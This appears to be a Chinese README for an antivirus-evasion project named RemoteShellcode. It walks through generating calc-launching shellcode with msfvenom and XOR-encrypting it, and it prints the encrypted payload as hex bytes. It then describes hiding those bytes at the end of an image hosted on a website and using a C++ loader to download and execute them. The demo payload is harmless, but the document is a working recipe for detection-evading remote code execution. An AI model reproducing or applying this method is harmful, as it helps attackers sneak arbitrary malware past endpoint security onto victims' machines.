# RemoteShellcode
采用分离加载文件的方式实现静态免杀，从而降低静态检测风险
通过命令生成一段弹计算器的shellcode
msfvenom -p windows/x64/exec cmd=calc.exe -f python
image
接着用EncryptedShellcode.py进行xor的加密
image
再把结果转换为十六进制
a8 20 ea 97 99 9b a1 78 6f 72 2a 34 38 04 3a 38 25 21 42 b3 1d 27 f9 39 05 31 df 3a 71 3b e2 21 41 30 e4 00 3b 2d 76 e3 22 23 3e 58 ba 29 49 af de 57 04 05 56 44 49 32 a8 ba 6c 39 6e b3 89 88 2b 15 39 21 f8 3b 53 ea 3a 53 3a 6a b5 f2 d4 e0 69 73 69 3b e4 b8 1b 15 23 64 a9 04 e3 21 6b 2d f8 21 58 26 73 bb 86 2f 1c 97 a0 32 e2 47 e9 30 6e a4 26 54 b0 1c 59 a9 df 28 b2 a8 75 2e 73 aa 5d 99 21 99 25 70 25 57 69 3d 56 a3 1e bd 21 10 e3 29 57 20 72 b1 1e 2e f9 67 2d 3d df 28 75 3a 68 a3 20 f3 6b fa 23 64 a9 15 30 28 2b 37 2a 3b 39 37 33 32 24 23 1c eb 85 53 28 21 9e 98 37 33 32 3f 31 df 7a 80 24 96 8c 9e 25 27 c8 6a 65 79 54 68 69 73 69 3b ec f5 6e 73 6b 65 38 ee 59 e2 1c ee 8c b4 c3 9f c7 c9 33 38 ee ce fc ce f4 8c b4 30 ec b6 43 59 7f 28 62 e9 88 89 06 64 c3 28 61 19 0a 13 54 31 28 fa b3 8c b4 1b 0e 1e 08 4b 1c 2c 0d 69
用010editor工具导入到某张图片的末尾
image
最后再把生成的图片放到某个网站下面
image
用RemoteLoader.cpp替换url编译运行，成功弹窗
image
